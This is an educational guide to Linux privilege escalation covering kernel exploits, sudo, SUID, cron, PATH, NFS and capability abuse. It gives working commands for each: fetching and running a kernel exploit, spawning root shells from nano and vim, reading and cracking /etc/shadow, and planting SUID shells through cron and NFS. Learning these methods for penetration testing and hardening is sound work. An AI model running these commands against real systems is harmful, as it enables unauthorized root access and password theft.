


# Linux Privilege Escalation Guide



## What is Privilege Escalation?

Privilege escalation is when a user increases their access level on a system beyond what they’re supposed to have. For example, a regular user might gain root (administrator) access, allowing them to read sensitive files, change settings, or execute any command. It’s critical for:
- **Attackers**: To maximize control after initial access.
- **Penetration Testers**: To identify and report weaknesses.
- **Admins**: To secure systems against unauthorized access.

There are two types:
- **Vertical**: Gaining higher privileges (e.g., user to root).
- **Horizontal**: Accessing another user’s account at the same level.

## Why Enumeration Matters

Enumeration is the process of gathering information about a system to find privilege escalation opportunities. Common commands include:
- `uname -a`: Kernel version.
- `sudo -l`: Sudo permissions.
- `find / -perm -u=s`: SUID files.
- `cat /etc/crontab`: Cron jobs.
- `echo $PATH`: PATH variable.
- `cat /etc/exports`: NFS settings.
- `getcap -r /`: Capabilities.

Tools like **LinPEAS** or **LinEnum** can automate enumeration, but manual checks are essential for precision.

## Privilege Escalation Methods

Below are seven methods to achieve privilege escalation on Linux, each with an example and a detailed breakdown.

### 1. Kernel Exploits

**Description**: The Linux kernel manages system resources. Bugs in the kernel can be exploited to gain root access, as the kernel runs with the highest privileges.

**Example**:
```bash
# Check kernel version
uname -a
# Output: Linux target 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

# Download and compile an exploit for CVE-2015-1328
wget http://exploit-db.com/exploits/37292.c -O exploit.c
gcc exploit.c -o exploit
./exploit
# Spawns root shell
whoami
# Output: root
cat /root/secret.txt
# Output: Super secret data
```

**Word-by-Word Explanation**:
- `uname -a`: 
  - `uname`: Command to display system information.
  - `-a`: Option to show all details (kernel version, OS, architecture).
  - *Purpose*: Reveals the kernel version (`3.13.0-24-generic`), which we use to find a matching exploit.
- `wget http://exploit-db.com/exploits/37292.c -O exploit.c`:
  - `wget`: Downloads files from the web.
  - `http://exploit-db.com/exploits/37292.c`: URL of an exploit for CVE-2015-1328, a kernel vulnerability.
  - `-O exploit.c`: Saves the file as `exploit.c`.
  - *Purpose*: Retrieves exploit code tailored for the kernel version.
- `gcc exploit.c -o exploit`:
  - `gcc`: GNU compiler to compile C code.
  - `exploit.c`: The exploit source file.
  - `-o exploit`: Names the compiled binary `exploit`.
  - *Purpose*: Converts the C code into an executable program.
- `./exploit`:
  - `./`: Runs the executable in the current directory.
  - `exploit`: The compiled exploit binary.
  - *Purpose*: Executes the exploit, which manipulates the kernel bug to grant a root shell.
- `whoami`:
  - `whoami`: Prints the current user.
  - *Purpose*: Confirms you’re now `root`.
- `cat /root/secret.txt`:
  - `cat`: Displays file contents.
  - `/root/secret.txt`: A root-only file.
  - *Purpose*: Demonstrates root access by reading a restricted file.

**Risks**: Kernel exploits can crash the system. Always verify the exploit’s compatibility and test in a safe environment.

---

### 2. Sudo Misconfigurations

**Description**: The `sudo` command allows users to run programs as root. If a user has `sudo` access to certain commands, these can be exploited to gain a root shell or access restricted resources.

**Example**:
```bash
# Check sudo permissions
sudo -l
# Output: User karen may run the following commands on target:
#       (root) NOPASSWD: /usr/bin/nano

# Exploit nano to spawn a root shell
sudo nano
# Inside nano, press Ctrl+R, Ctrl+X, then type:
reset; sh 1>&0 2>&0
# Spawns root shell
whoami
# Output: root
cat /etc/shadow
# Output: root:$6$...:0:99999:7:::
```

**Word-by-Word Explanation**:
- `sudo -l`:
  - `sudo`: Runs commands as another user (usually root).
  - `-l`: Lists commands the user can run with `sudo`.
  - *Purpose*: Shows that user `karen` can run `nano` as root without a password (`NOPASSWD`).
- `sudo nano`:
  - `sudo`: Executes the command as root.
  - `nano`: A text editor.
  - *Purpose*: Opens `nano` with root privileges, allowing access to its features.
- `Ctrl+R, Ctrl+X`:
  - `Ctrl+R`: In `nano`, opens the “read file” prompt.
  - `Ctrl+X`: Switches to the “execute command” prompt.
  - *Purpose*: Allows running a shell command from within `nano`.
- `reset; sh 1>&0 2>&0`:
  - `reset`: Clears the terminal (optional, improves shell appearance).
  - `;`: Separates commands.
  - `sh`: Starts a shell.
  - `1>&0`: Redirects stdout to stdin.
  - `2>&0`: Redirects stderr to stdin.
  - *Purpose*: Spawns a root shell by exploiting `nano`’s command execution feature.
- `whoami`:
  - *Purpose*: Confirms root access.
- `cat /etc/shadow`:
  - `cat`: Displays file contents.
  - `/etc/shadow`: Stores password hashes, readable only by root.
  - *Purpose*: Shows root-level access by reading a restricted file.

**Note**: Check [GTFOBins](https://gtfobins.github.io/) for other exploitable `sudo` commands (e.g., `find`, `less`).

---

### 3. SUID/SGID Binaries

**Description**: SUID (Set User ID) and SGID (Set Group ID) binaries run with the permissions of their owner or group (often root). Misconfigured SUID/SGID binaries can be exploited to gain higher privileges.

**Example**:
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
# Output: /usr/bin/base64

# Exploit base64 to read /etc/shadow
/usr/bin/base64 /etc/shadow | base64 -d
# Output: root:$6$...:0:99999:7:::
# Crack hash with john
echo "root:$6$..." > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Output: password123 (root)
```

**Word-by-Word Explanation**:
- `find / -perm -u=s -type f 2>/dev/null`:
  - `find`: Searches for files.
  - `/`: Starts search from the root directory.
  - `-perm -u=s`: Matches files with the SUID bit set.
  - `-type f`: Limits to regular files.
  - `2>/dev/null`: Redirects error messages to `/dev/null`.
  - *Purpose*: Lists SUID binaries, finding `/usr/bin/base64`.
- `/usr/bin/base64 /etc/shadow | base64 -d`:
  - `/usr/bin/base64`: Runs the `base64` binary, which has SUID and runs as root.
  - `/etc/shadow`: The target file (password hashes).
  - `|`: Pipes output to the next command.
  - `base64 -d`: Decodes base64-encoded text.
  - *Purpose*: Uses `base64`’s root privileges to read `/etc/shadow`, then decodes the output.
- `echo "root:$6$..." > hash.txt`:
  - `echo`: Prints text.
  - `"root:$6$..."`: The root user’s hash from `/etc/shadow`.
  - `>`: Redirects output to a file.
  - `hash.txt`: The output file.
  - *Purpose*: Saves the hash for cracking.
- `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`:
  - `john`: Password cracker.
  - `--wordlist=...`: Uses the `rockyou.txt` wordlist.
  - `hash.txt`: The file with the hash.
  - *Purpose*: Cracks the hash, revealing the password (`password123`).

**Note**: Use GTFOBins to find exploitable SUID binaries. Not all SUID binaries are vulnerable.

---

### 4. Cron Jobs

**Description**: Cron jobs are scheduled tasks that run automatically, often as root. If a cron job uses a writable script, you can modify it to execute malicious code.

**Example**:
```bash
# Check cron jobs
cat /etc/crontab
# Output: * * * * * root /tmp/backup.sh

# Check if backup.sh is writable
ls -l /tmp/backup.sh
# Output: -rwxrwxrwx 1 root root 50 backup.sh

# Modify backup.sh to spawn a root shell
echo '#!/bin/bash' > /tmp/backup.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/backup.sh
chmod +x /tmp/backup.sh

# Wait 1 minute, then run the new binary
/tmp/rootbash -p
# Spawns root shell
whoami
# Output: root
```

**Word-by-Word Explanation**:
- `cat /etc/crontab`:
  - `cat`: Displays file contents.
  - `/etc/crontab`: System-wide cron configuration.
  - *Purpose*: Shows a cron job running `/tmp/backup.sh` as root every minute (`* * * * *`).
- `ls -l /tmp/backup.sh`:
  - `ls -l`: Lists file details.
  - `/tmp/backup.sh`: The cron job script.
  - *Output*: `-rwxrwxrwx` means everyone can write to it.
  - *Purpose*: Confirms the script is writable.
- `echo '#!/bin/bash' > /tmp/backup.sh`:
  - `echo`: Prints text.
  - `'#!/bin/bash'`: Specifies the script uses Bash.
  - `>`: Overwrites the file.
  - `/tmp/backup.sh`: The target script.
  - *Purpose*: Starts a new script.
- `echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/backup.sh`:
  - `echo`: Prints text.
  - `cp /bin/bash /tmp/rootbash`: Copies the Bash binary.
  - `;`: Separates commands.
  - `chmod +s /tmp/rootbash`: Sets SUID on the copy.
  - `>>`: Appends to the file.
  - *Purpose*: Adds commands to create a root-privileged Bash binary.
- `chmod +x /tmp/backup.sh`:
  - `chmod`: Changes file permissions.
  - `+x`: Makes the file executable.
  - `/tmp/backup.sh`: The modified script.
  - *Purpose*: Ensures the cron job can run the script.
- `/tmp/rootbash -p`:
  - `/tmp/rootbash`: The SUID Bash binary.
  - `-p`: Preserves privileges (runs as root).
  - *Purpose*: Runs the new binary to get a root shell.
- `whoami`:
  - *Purpose*: Confirms root access.

**Note**: Cron jobs with absolute paths or non-writable scripts are harder to exploit.

---

### 5. PATH Manipulation

**Description**: The `PATH` variable tells Linux where to look for executables. If a root-owned script runs a program without a full path and you can modify `PATH`, you can trick it into running your malicious program.

**Example**:
```bash
# Check PATH
echo $PATH
# Output: /usr/bin:/bin

# Find writable directories
find / -writable -type d 2>/dev/null
# Output: /home/user

# Add writable directory to PATH
export PATH=/home/user:$PATH

# Create malicious program
echo '#!/bin/bash' > /home/user/thm
echo '/bin/bash' >> /home/user/thm
chmod +x /home/user/thm

# Run SUID script that calls 'thm'
/usr/local/bin/test
# Spawns root shell
whoami
# Output: root
```

**Word-by-Word Explanation**:
- `echo $PATH`:
  - `echo`: Prints text.
  - `$PATH`: The PATH environment variable.
  - *Purpose*: Shows where Linux looks for executables.
- `find / -writable -type d 2>/dev/null`:
  - `find`: Searches for files/directories.
  - `/`: Root directory.
  - `-writable`: Matches writable items.
  - `-type d`: Limits to directories.
  - `2>/dev/null`: Suppresses errors.
  - *Purpose*: Finds writable directories like `/home/user`.
- `export PATH=/home/user:$PATH`:
  - `export`: Sets an environment variable.
  - `PATH=/home/user:$PATH`: Adds `/home/user` to the start of PATH.
  - *Purpose*: Ensures Linux checks `/home/user` first for executables.
- `echo '#!/bin/bash' > /home/user/thm`:
  - `echo`: Prints text.
  - `'#!/bin/bash'`: Specifies a Bash script.
  - `>`: Creates/overwrites the file.
  - `/home/user/thm`: The fake program.
  - *Purpose*: Starts a script named `thm`.
- `echo '/bin/bash' >> /home/user/thm`:
  - `echo`: Prints text.
  - `'/bin/bash'`: Command to spawn a shell.
  - `>>`: Appends to the file.
  - `/home/user/thm`: The target file.
  - *Purpose*: Makes `thm` spawn a Bash shell.
- `chmod +x /home/user/thm`:
  - `chmod +x`: Makes the file executable.
  - `/home/user/thm`: The fake program.
  - *Purpose*: Allows the script to run.
- `/usr/local/bin/test`:
  - `/usr/local/bin/test`: An SUID script that calls `thm` without a full path.
  - *Purpose*: Runs the script, which executes `/home/user/thm` as root due to SUID.
- `whoami`:
  - *Purpose*: Confirms root access.

**Note**: Requires an SUID script that uses relative paths.

---

### 6. NFS Misconfigurations

**Description**: Network File System (NFS) shares folders across systems. If a share has `no_root_squash`, you can create root-owned files with SUID, which can be executed on the target system.

**Example** (Run on attacker machine and target):
```bash
# On target: Check NFS configuration
cat /etc/exports
# Output: /tmp *(rw,no_root_squash)

# On attacker: Mount NFS share
mkdir /mnt/nfs
sudo mount -o rw 192.168.1.100:/tmp /mnt/nfs

# Create exploit
echo '#include <stdio.h>' > /mnt/nfs/exploit.c
echo 'int main() { setuid(0); system("/bin/bash"); return 0; }' >> /mnt/nfs/exploit.c
gcc /mnt/nfs/exploit.c -o /mnt/nfs/exploit
chmod +s /mnt/nfs/exploit

# On target: Run exploit
/tmp/exploit
# Spawns root shell
whoami
# Output: root
```

**Word-by-Word Explanation**:
- `cat /etc/exports`:
  - `cat`: Displays file contents.
  - `/etc/exports`: NFS configuration file.
  - *Output*: `/tmp *(rw,no_root_squash)` means `/tmp` is shared with read-write (`rw`) and `no_root_squash`.
  - *Purpose*: Confirms the share allows root-owned files.
- `mkdir /mnt/nfs`:
  - `mkdir`: Creates a directory.
  - `/mnt/nfs`: The mount point.
  - *Purpose*: Prepares a directory for mounting.
- `sudo mount -o rw 192.168.1.100:/tmp /mnt/nfs`:
  - `sudo`: Runs as root.
  - `mount`: Mounts a filesystem.
  - `-o rw`: Specifies read-write access.
  - `192.168.1.100:/tmp`: The target’s NFS share.
  - `/mnt/nfs`: The local mount point.
  - *Purpose*: Mounts the target’s `/tmp` on the attacker’s machine.
- `echo '#include <stdio.h>' > /mnt/nfs/exploit.c`:
  - `echo`: Prints text.
  - `'#include <stdio.h>'`: Includes the C standard library.
  - `>`: Creates/overwrites the file.
  - `/mnt/nfs/exploit.c`: The C source file.
  - *Purpose*: Starts a C program.
- `echo 'int main() { setuid(0); system("/bin/bash"); return 0; }' >> /mnt/nfs/exploit.c`:
  - `echo`: Prints text.
  - `'int main() {...}'`: Defines the main function.
  - `setuid(0)`: Sets the user ID to root (0).
  - `system("/bin/bash")`: Runs a Bash shell.
  - `return 0`: Exits the program.
  - `>>`: Appends to the file.
  - *Purpose*: Creates a program that spawns a root shell.
- `gcc /mnt/nfs/exploit.c -o /mnt/nfs/exploit`:
  - `gcc`: Compiles the C code.
  - `/mnt/nfs/exploit.c`: The source file.
  - `-o /mnt/nfs/exploit`: Names the output binary.
  - *Purpose*: Creates an executable.
- `chmod +s /mnt/nfs/exploit`:
  - `chmod +s`: Sets the SUID bit.
  - `/mnt/nfs/exploit`: The binary.
  - *Purpose*: Ensures the binary runs as root.
- `/tmp/exploit`:
  - `/tmp/exploit`: The SUID binary on the target.
  - *Purpose*: Runs the exploit to spawn a root shell.
- `whoami`:
  - *Purpose*: Confirms root access.

**Note**: Requires NFS access and `no_root_squash`. Static compilation (`gcc -static`) may be needed for compatibility.

---

### 7. Capabilities

**Description**: Capabilities grant specific privileges to binaries (e.g., binding to ports). If a binary has excessive capabilities (e.g., `cap_setuid`), it can be exploited to gain root access.

**Example**:
```bash
# List binaries with capabilities
getcap -r / 2>/dev/null
# Output: /usr/bin/vim = cap_setuid+ep

# Exploit vim’s capability
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
# Spawns root shell
whoami
# Output: root
```

**Word-by-Word Explanation**:
- `getcap -r / 2>/dev/null`:
  - `getcap`: Lists capabilities.
  - `-r`: Recursive search.
  - `/`: Root directory.
  - `2>/dev/null`: Suppresses errors.
  - *Output*: `/usr/bin/vim = cap_setuid+ep` means `vim` can set user IDs (including root).
  - *Purpose*: Identifies exploitable binaries.
- `/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`:
  - `/usr/bin/vim`: Runs `vim`.
  - `-c`: Executes a command in `vim`.
  - `':py3'`: Runs Python 3 in `vim`.
  - `import os`: Imports the OS module.
  - `os.setuid(0)`: Sets the user ID to root (allowed by `cap_setuid`).
  - `os.execl("/bin/sh", "sh", "-c", "reset; exec sh")`: Replaces the process with a shell.
  - `reset`: Clears the terminal.
  - `exec sh`: Runs a shell.
  - *Purpose*: Uses `vim`’s capability to spawn a root shell.
- `whoami`:
  - *Purpose*: Confirms root access.

**Note**: Check GTFOBins for other binaries with exploitable capabilities.

---

## Prevention Tips

To secure systems against privilege escalation:
- **Patch Regularly**: Update the kernel and software.
- **Limit Sudo**: Restrict `sudo` to necessary commands.
- **Remove SUID/SGID**: Only use SUID/SGID when essential.
- **Secure Cron Jobs**: Use absolute paths and restrict script permissions.
- **Lock Down PATH**: Avoid writable directories in `PATH`.
- **Fix NFS**: Disable `no_root_squash`.
- **Minimize Capabilities**: Remove unnecessary capabilities with `setcap`.
- **Monitor**: Use tools like auditd to detect suspicious activity.

---

## Resources

- **GTFOBins**: https://gtfobins.github.io/ (Exploits for `sudo`, SUID, and capabilities).
- **Exploit-DB**: https://www.exploit-db.com/ (Kernel exploits).
- **LinPEAS**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite (Enumeration tool).
- **John the Ripper**: https://www.openwall.com/john/ (Password cracker).

---


